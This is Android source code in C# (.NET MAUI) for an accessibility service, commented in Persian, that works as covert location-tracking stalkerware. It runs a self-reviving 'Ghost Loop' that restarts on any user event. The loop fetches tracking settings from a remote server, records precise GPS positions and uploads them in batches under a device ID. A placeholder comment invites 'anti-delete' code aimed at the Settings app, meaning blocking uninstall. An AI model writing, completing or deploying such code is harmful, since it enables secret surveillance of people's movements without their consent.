#if ANDROID
using Android.AccessibilityServices;
using Android.App;
using Android.Content;
using Android.Views.Accessibility;
using Android.Gms.Location;
using Android.Gms.Extensions;
using Android.OS;
using appc.Data;
using appc.Sync;
using appc.Platforms.Android;

namespace appc.Platforms.Android;

[Service(Permission = "android.permission.BIND_ACCESSIBILITY_SERVICE", Exported = true)]
[IntentFilter(new[] { "android.accessibilityservice.AccessibilityService" })]
[MetaData("android.accessibilityservice", Resource = "@xml/accessibility_config")]
public class MyA11yService : AccessibilityService
{
    #region [ فیلدها و متغیرهای کنترلی ]
    private CancellationTokenSource? _cts;
    private IFusedLocationProviderClient? _fused;
    private TrackDb? _db;
    private BatchSyncer? _sync;
    private ConfigClient? _cfgClient;

    private string _deviceId = "";
    private DateTime _nextUploadUtc = DateTime.MinValue;
    private DateTime _nextCfgUtc = DateTime.MinValue;
    private bool _isLoopRunning = false; // پرچم وضعیت لوپ برای سیستم زنده نگهداشتن
    #endregion

    #region [ چرخه حیات سرویس ]
    protected override void OnServiceConnected()
    {
        base.OnServiceConnected();

        SetServiceInfo(new AccessibilityServiceInfo
        {
            EventTypes = EventTypes.WindowStateChanged | EventTypes.WindowContentChanged,
            FeedbackType = FeedbackFlags.Generic,
            Flags = AccessibilityServiceFlags.ReportViewIds | AccessibilityServiceFlags.RetrieveInteractiveWindows,
            NotificationTimeout = 150
        });

        _fused = LocationServices.GetFusedLocationProviderClient(this);
        _db = ServiceProvider.GetService<TrackDb>();
        _sync = ServiceProvider.GetService<BatchSyncer>();
        _cfgClient = ServiceProvider.GetService<ConfigClient>();
        _deviceId = DeviceIdProvider.Get(this);

        StartGhostLoop();
    }

    public override void OnInterrupt()
    {
        _isLoopRunning = false;
        _cts?.Cancel();
    }
    #endregion

    #region [ سیستم زنده موندن (Self-Healing) ]
    // این متد قلب تپنده سیستم مخفی توئه. با هر حرکت کاربر، اگر لوپ کشته شده باشه، دوباره بیدارش می‌کنه.
    public override void OnAccessibilityEvent(AccessibilityEvent? e)
    {
        if (e == null) return;

        // چک کردن زنده بودن لوپ
        if (!_isLoopRunning || _cts == null || _cts.IsCancellationRequested)
        {
            AppLog.Write("⚠️ Ghost Loop was inactive. Reviving now...");
            StartGhostLoop();
        }

        // --- اینجا می‌تونی کدهای ضد حذف (Anti-Delete) رو قرار بدی ---
        // var pkg = e.PackageName?.ToString() ?? "";
        // if (pkg == "com.android.settings") { ... }
    }

    private void StartGhostLoop()
    {
        _cts?.Cancel();
        _cts = new CancellationTokenSource();

        _nextCfgUtc = DateTime.MinValue;
        _nextUploadUtc = DateTime.MinValue;

        _ = LoopAsync(_cts.Token);
    }
    #endregion

    #region [ حلقه اصلی گزارش‌گیری (Loop) ]
    private async Task LoopAsync(CancellationToken ct)
    {
        _isLoopRunning = true;
        AppLog.Write("👻 Ghost Loop Started.");

        while (!ct.IsCancellationRequested)
        {
            try
            {
                // ۱. بروزرسانی تنظیمات از سرور (هر ۶۰ ثانیه)
                if (_cfgClient != null && DateTime.UtcNow >= _nextCfgUtc)
                {
                    _nextCfgUtc = DateTime.UtcNow.AddSeconds(60);
                    var cfg = await _cfgClient.FetchAsync(ct);
                    if (cfg != null)
                    {
                        TrackingSettings.Enabled = cfg.enabled;
                        TrackingSettings.IntervalSeconds = cfg.interval_seconds;
                        TrackingSettings.WindowStart = cfg.window_start;
                        TrackingSettings.WindowEnd = cfg.window_end;
                        TrackingSettings.UploadEveryMinutes = cfg.upload_every_minutes;
                        AppLog.Write("CFG ✅ Updated from server");
                    }
                }

                var interval = TrackingSettings.IntervalSeconds < 5 ? 5 : TrackingSettings.IntervalSeconds;

                // ۲. بررسی شرایط فعالیت
                if (TrackingSettings.Enabled && TrackingSettings.IsNowInWindow())
                {
                    // ۳. عملیات آپلود (Sync)
                    if (_sync != null && DateTime.UtcNow >= _nextUploadUtc)
                    {
                        var uploadMin = TrackingSettings.UploadEveryMinutes < 1 ? 1 : TrackingSettings.UploadEveryMinutes;
                        _nextUploadUtc = DateTime.UtcNow.AddMinutes(uploadMin);
                        var sentCount = await _sync.UploadOnceAsync(_deviceId);
                        if (sentCount > 0) AppLog.Write($"Cloud ✅ Sent {sentCount} points");
                    }

                    // ۴. عملیات دریافت لوکیشن
                    var location = await GetBestLocationAsync(8, ct);
                    if (location != null && _db != null)
                    {
                        await _db.InsertAsync(new LocationPoint
                        {
                            TimestampUtc = DateTimeOffset.UtcNow.ToUnixTimeSeconds(),
                            Lat = location.Latitude,
                            Lng = location.Longitude,
                            Acc = location.Accuracy
                        });
                        AppLog.Write($"Loc ✅ Saved ({location.Accuracy:0}m)");
                    }
                }
            }
            catch (Exception ex)
            {
                AppLog.Write("❌ Loop Error: " + ex.Message);
            }

            // انتظار برای چرخه بعدی
            var sleepSec = TrackingSettings.Enabled ? TrackingSettings.IntervalSeconds : 30;
            await Task.Delay(TimeSpan.FromSeconds(sleepSec < 5 ? 5 : sleepSec), ct);
        }

        _isLoopRunning = false;
        AppLog.Write("👻 Ghost Loop Stopped.");
    }
    #endregion

    #region [ متدهای تخصصی دریافت لوکیشن ]
    private async Task<global::Android.Locations.Location?> GetBestLocationAsync(int timeoutSeconds, CancellationToken ct)
    {
        // تلاش اول: دریافت لوکیشن تازه (High Accuracy)
        var fresh = await GetOneShotAsync(timeoutSeconds, ct);
        if (fresh != null) return fresh;

        // تلاش دوم: استفاده از آخرین لوکیشن شناخته شده (Last Known)
        if (_fused == null) return null;
        try
        {
            return await _fused.GetLastLocationAsync();
        }
        catch { return null; }
    }

    private Task<global::Android.Locations.Location?> GetOneShotAsync(int timeoutSeconds, CancellationToken ct)
    {
        if (_fused == null) return Task.FromResult<global::Android.Locations.Location?>(null);

        var tcs = new TaskCompletionSource<global::Android.Locations.Location?>();

        var request = new global::Android.Gms.Location.LocationRequest.Builder(
                global::Android.Gms.Location.Priority.PriorityHighAccuracy, 1000)
            .SetMaxUpdates(1) // فقط یکبار تلاش کن
            .Build();

        LocationCallback? callback = null;
        callback = new OneShotLocationCallback(loc =>
        {
            try { _fused.RemoveLocationUpdates(callback); } catch { }
            tcs.TrySetResult(loc);
        });

        _fused.RequestLocationUpdates(request, callback, Looper.MainLooper);

        // مدیریت تایم‌اوت برای جلوگیری از معطل موندن لوپ
        Task.Run(async () =>
        {
            await Task.Delay(TimeSpan.FromSeconds(timeoutSeconds), ct);
            if (!tcs.Task.IsCompleted)
            {
                try { _fused.RemoveLocationUpdates(callback); } catch { }
                tcs.TrySetResult(null);
            }
        }, ct);

        return tcs.Task;
    }

    private sealed class OneShotLocationCallback : LocationCallback
    {
        private readonly Action<global::Android.Locations.Location?> _onLocation;
        public OneShotLocationCallback(Action<global::Android.Locations.Location?> onLocation) => _onLocation = onLocation;
        public override void OnLocationResult(LocationResult result) => _onLocation(result?.LastLocation);
    }
    #endregion
}

public static class ServiceProvider
{
    public static T? GetService<T>() => MauiApplication.Current.Services.GetService<T>();
}
#endif